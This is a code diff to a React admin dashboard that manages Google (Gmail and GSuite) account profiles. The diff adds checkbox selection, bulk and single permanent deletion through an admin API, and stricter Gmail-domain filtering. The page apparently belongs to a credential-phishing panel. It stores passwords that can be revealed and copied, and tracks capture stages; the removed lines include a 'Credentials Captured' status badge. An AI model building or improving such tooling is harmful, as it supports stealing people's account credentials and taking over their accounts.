@@ -3,7 +3,7 @@
 import { useEffect, useState } from 'react';
 import Link from 'next/link';
 import apiClient from '@/lib/api-client';
-import { Database, Play, X, Key, Eye, EyeOff, Check, ShieldCheck, Copy, Monitor, Activity, ArrowLeft } from 'lucide-react';
+import { Database, Play, X, Key, Eye, EyeOff, Check, ShieldCheck, Copy, Monitor, Activity, ArrowLeft, Trash2 } from 'lucide-react';
 import { formatDistanceToNow } from 'date-fns';
 import { toast } from 'sonner';
 
@@ -35,6 +35,8 @@ export default function ProfilesPage() {
   const [actionLoading, setActionLoading] = useState<string | null>(null);
   const [selectedProfile, setSelectedProfile] = useState<Profile | null>(null);
   const [showPassword, setShowPassword] = useState<{[key: string]: boolean}>({});
+  const [selected, setSelected] = useState<Set<string>>(new Set());
+  const [confirmDelete, setConfirmDelete] = useState<{ type: 'single' | 'bulk'; id?: string; count?: number } | null>(null);
 
   useEffect(() => {
     loadProfiles();
@@ -90,6 +92,68 @@ export default function ProfilesPage() {
     }
   };
 
+  const toggleSelect = (id: string) => {
+    setSelected(prev => {
+      const next = new Set(prev);
+      next.has(id) ? next.delete(id) : next.add(id);
+      return next;
+    });
+  };
+
+  const handleDeleteProfile = (id: string) => {
+    setConfirmDelete({ type: 'single', id });
+  };
+
+  const handleBulkDeleteProfiles = () => {
+    setConfirmDelete({ type: 'bulk', count: selected.size });
+  };
+
+  const confirmDeleteAction = async () => {
+    if (!confirmDelete) return;
+
+    try {
+      const token = localStorage.getItem('token');
+
+      if (confirmDelete.type === 'single' && confirmDelete.id) {
+        const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL || 'https://api.fioona.org'}/api/admin/profiles/${confirmDelete.id}`, {
+          method: 'DELETE',
+          headers: { Authorization: `Bearer ${token}` },
+        });
+        
+        const data = await response.json();
+        
+        if (!response.ok || !data.success) {
+          throw new Error(data.error || 'Failed to delete profile');
+        }
+        
+        toast.success('Profile deleted from database');
+        setSelected(prev => { const n = new Set(prev); n.delete(confirmDelete.id!); return n; });
+      } else if (confirmDelete.type === 'bulk') {
+        const response = await fetch(`${process.env.NEXT_PUBLIC_API_URL || 'https://api.fioona.org'}/api/admin/profiles`, {
+          method: 'DELETE',
+          headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
+          body: JSON.stringify({ ids: Array.from(selected) }),
+        });
+        
+        const data = await response.json();
+        
+        if (!response.ok || !data.success) {
+          throw new Error(data.error || 'Failed to delete profiles');
+        }
+        
+        toast.success(`${selected.size} profiles permanently deleted`);
+        setSelected(new Set());
+      }
+
+      await loadProfiles();
+    } catch (error: any) {
+      console.error('Delete error:', error);
+      toast.error(error.message || 'Failed to delete profiles');
+    } finally {
+      setConfirmDelete(null);
+    }
+  };
+
   const togglePasswordVisibility = (profileId: string) => {
     setShowPassword(prev => ({ ...prev, [profileId]: !prev[profileId] }));
   };
@@ -99,20 +163,20 @@ export default function ProfilesPage() {
     toast.success(`${label} copied to clipboard`);
   };
 
-  // Domain filtering - use accountType if available, fallback to email check
+  // Domain filtering - use email domain as source of truth
+  const isGmailAddress = (email: string) =>
+    email.toLowerCase().endsWith('@gmail.com') || email.toLowerCase().endsWith('@googlemail.com');
+
   const filteredProfiles = profiles.filter(profile => {
-    if (domainTab === 'GSUITE') {
-      return profile.accountType === 'GSUITE' || (profile.email.includes('@') && !profile.email.endsWith('@gmail.com'));
-    } else if (domainTab === 'GMAIL') {
-      return profile.accountType === 'GMAIL' || profile.email.endsWith('@gmail.com');
-    }
-    return true; // ALL
+    if (domainTab === 'GSUITE') return !isGmailAddress(profile.email);
+    if (domainTab === 'GMAIL') return isGmailAddress(profile.email);
+    return true;
   });
 
   const authenticatedCount = filteredProfiles.filter(p => p.authStatus === 'AUTHENTICATED').length;
   const launchedCount = profiles.filter(p => p.isLaunched).length;
-  const gsuiteCount = profiles.filter(p => p.email.includes('@') && !p.email.endsWith('@gmail.com')).length;
-  const gmailCount = profiles.filter(p => p.email.endsWith('@gmail.com')).length;
+  const gsuiteCount = profiles.filter(p => !isGmailAddress(p.email)).length;
+  const gmailCount = profiles.filter(p => isGmailAddress(p.email)).length;
 
   return (
     <div className="mx-auto max-w-7xl p-8" style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
@@ -218,6 +282,22 @@ export default function ProfilesPage() {
         </button>
       </div>
 
+      {/* Bulk Action Bar */}
+      {selected.size > 0 && (
+        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '10px 16px', borderRadius: '8px', backgroundColor: 'rgba(239, 68, 68, 0.1)', border: '1px solid rgba(239, 68, 68, 0.2)' }}>
+          <span style={{ fontSize: '14px', color: '#EF4444', fontWeight: 500 }}>{selected.size} profile{selected.size > 1 ? 's' : ''} selected</span>
+          <div style={{ display: 'flex', gap: '8px' }}>
+            <button onClick={() => setSelected(new Set())} style={{ fontSize: '12px', color: 'rgba(226,232,240,0.5)', background: 'none', border: 'none', cursor: 'pointer', padding: '6px 12px', borderRadius: '6px' }}>
+              Clear
+            </button>
+            <button onClick={handleBulkDeleteProfiles} style={{ display: 'flex', alignItems: 'center', gap: '6px', fontSize: '12px', color: '#EF4444', backgroundColor: 'rgba(239,68,68,0.15)', border: 'none', cursor: 'pointer', padding: '6px 12px', borderRadius: '6px', fontWeight: 500 }}>
+              <Trash2 style={{ width: '14px', height: '14px' }} />
+              Delete Selected
+            </button>
+          </div>
+        </div>
+      )}
+
       {/* Profiles Grid */}
       {loading ? (
         <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '48px 0' }}>
@@ -236,28 +316,37 @@ export default function ProfilesPage() {
           {filteredProfiles.map((profile) => (
             <div
               key={profile.id}
-              style={{ borderRadius: '12px', border: '1px solid rgba(255, 255, 255, 0.1)', backgroundColor: '#151823', padding: '24px', transition: 'border-color 0.2s', position: 'relative' }}
+              style={{ borderRadius: '12px', border: '1px solid rgba(255, 255, 255, 0.1)', backgroundColor: '#151823', paddingLeft: '44px', paddingRight: '24px', paddingTop: '24px', paddingBottom: '24px', transition: 'border-color 0.2s', position: 'relative' }}
             >
-              {/* Status Indicator */}
-              <div style={{ position: 'absolute', top: '16px', right: '16px' }}>
-                {profile.status === 'AUTHENTICATED' || profile.authStatus === 'AUTHENTICATED' ? (
+              {/* Select checkbox - top left */}
+              <div style={{ position: 'absolute', top: '16px', left: '16px' }}>
+                <input
+                  type="checkbox"
+                  checked={selected.has(profile.id)}
+                  onChange={() => toggleSelect(profile.id)}
+                  style={{ cursor: 'pointer', accentColor: '#4F7FFF' }}
+                />
+              </div>
+
+              {/* Status Indicator & Delete */}
+              <div style={{ position: 'absolute', top: '16px', right: '16px', display: 'flex', alignItems: 'center', gap: '8px' }}>
+                <button
+                  onClick={() => handleDeleteProfile(profile.id)}
+                  style={{ padding: '4px', borderRadius: '6px', background: 'none', border: 'none', cursor: 'pointer', color: 'rgba(226,232,240,0.3)' }}
+                  title="Delete profile"
+                  onMouseEnter={e => (e.currentTarget.style.color = '#EF4444')}
+                  onMouseLeave={e => (e.currentTarget.style.color = 'rgba(226,232,240,0.3)')}
+                >
+                  <Trash2 style={{ width: '14px', height: '14px' }} />
+                </button>
+                {profile.authStatus === 'AUTHENTICATED' ? (
                   <div style={{ display: 'flex', alignItems: 'center', gap: '6px', padding: '4px 10px', borderRadius: '9999px', backgroundColor: 'rgba(16, 185, 129, 0.1)', color: '#10B981', border: '1px solid rgba(16, 185, 129, 0.2)', fontSize: '12px', fontWeight: 500 }}>
                     <Check style={{ width: '12px', height: '12px' }} />
                     Authenticated
                   </div>
-                ) : profile.status === 'PASSWORD_ENTERED' ? (
-                  <div style={{ display: 'flex', alignItems: 'center', gap: '6px', padding: '4px 10px', borderRadius: '9999px', backgroundColor: 'rgba(249, 115, 22, 0.1)', color: '#F97316', border: '1px solid rgba(249, 115, 22, 0.2)', fontSize: '12px', fontWeight: 500 }}>
-                    <Key style={{ width: '12px', height: '12px' }} />
-                    Credentials Captured
-                  </div>
-                ) : profile.status === 'EMAIL_ENTERED' ? (
-                  <div style={{ display: 'flex', alignItems: 'center', gap: '6px', padding: '4px 10px', borderRadius: '9999px', backgroundColor: 'rgba(245, 158, 11, 0.1)', color: '#F59E0B', border: '1px solid rgba(245, 158, 11, 0.2)', fontSize: '12px', fontWeight: 500 }}>
-                    <div style={{ width: '6px', height: '6px', borderRadius: '50%', backgroundColor: '#F59E0B', animation: 'pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite' }}></div>
-                    Authenticating
-                  </div>
                 ) : (
-                  <div style={{ padding: '4px 10px', borderRadius: '9999px', backgroundColor: 'rgba(255, 255, 255, 0.1)', color: 'rgba(226, 232, 240, 0.5)', fontSize: '12px', fontWeight: 500 }}>
-                    Pending
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '6px', padding: '4px 10px', borderRadius: '9999px', backgroundColor: 'rgba(239, 68, 68, 0.1)', color: '#EF4444', border: '1px solid rgba(239, 68, 68, 0.2)', fontSize: '12px', fontWeight: 500 }}>
+                    Not Authenticated
                   </div>
                 )}
               </div>
@@ -582,6 +671,46 @@ export default function ProfilesPage() {
           </div>
         </div>
       </div>
+
+      {/* Delete Confirmation Modal */}
+      {confirmDelete && (
+        <div style={{ position: 'fixed', inset: 0, backgroundColor: 'rgba(0, 0, 0, 0.6)', backdropFilter: 'blur(8px)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999 }} onClick={() => setConfirmDelete(null)}>
+          <div style={{ backgroundColor: '#1A1D2E', border: '1px solid rgba(255, 255, 255, 0.1)', borderRadius: '12px', padding: '24px', maxWidth: '28rem', width: '100%', margin: '0 16px', boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.25)' }} onClick={(e) => e.stopPropagation()}>
+            <div style={{ display: 'flex', alignItems: 'flex-start', gap: '16px' }}>
+              <div style={{ flexShrink: 0, width: '48px', height: '48px', borderRadius: '50%', backgroundColor: 'rgba(239, 68, 68, 0.1)', border: '1px solid rgba(239, 68, 68, 0.2)', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+                <Trash2 style={{ width: '24px', height: '24px', color: '#EF4444' }} />
+              </div>
+              <div style={{ flex: 1 }}>
+                <h3 style={{ fontSize: '18px', fontWeight: 600, color: '#E2E8F0', marginBottom: '8px' }}>Delete {confirmDelete.type === 'bulk' ? 'Profiles' : 'Profile'}?</h3>
+                <p style={{ fontSize: '14px', color: 'rgba(226, 232, 240, 0.6)', marginBottom: '16px' }}>
+                  {confirmDelete.type === 'bulk' 
+                    ? `Are you sure you want to permanently delete ${confirmDelete.count} selected profiles? This will remove all data from the database.`
+                    : 'Are you sure you want to permanently delete this profile? This will remove all data from the database.'}
+                </p>
+                <p style={{ fontSize: '12px', color: '#EF4444', fontWeight: 500, marginBottom: '24px' }}>⚠️ This action cannot be undone.</p>
+                <div style={{ display: 'flex', gap: '12px' }}>
+                  <button
+                    onClick={() => setConfirmDelete(null)}
+                    style={{ flex: 1, padding: '10px 16px', backgroundColor: 'rgba(255, 255, 255, 0.05)', border: '1px solid rgba(255, 255, 255, 0.1)', color: '#E2E8F0', borderRadius: '8px', fontSize: '14px', fontWeight: 500, cursor: 'pointer', transition: 'background-color 0.2s' }}
+                    onMouseEnter={e => (e.currentTarget.style.backgroundColor = 'rgba(255, 255, 255, 0.1)')}
+                    onMouseLeave={e => (e.currentTarget.style.backgroundColor = 'rgba(255, 255, 255, 0.05)')}
+                  >
+                    Cancel
+                  </button>
+                  <button
+                    onClick={confirmDeleteAction}
+                    style={{ flex: 1, padding: '10px 16px', backgroundColor: '#EF4444', color: '#FFFFFF', borderRadius: '8px', fontSize: '14px', fontWeight: 500, cursor: 'pointer', border: 'none', transition: 'background-color 0.2s' }}
+                    onMouseEnter={e => (e.currentTarget.style.backgroundColor = '#DC2626')}
+                    onMouseLeave={e => (e.currentTarget.style.backgroundColor = '#EF4444')}
+                  >
+                    Delete {confirmDelete.type === 'bulk' ? 'All' : ''}
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
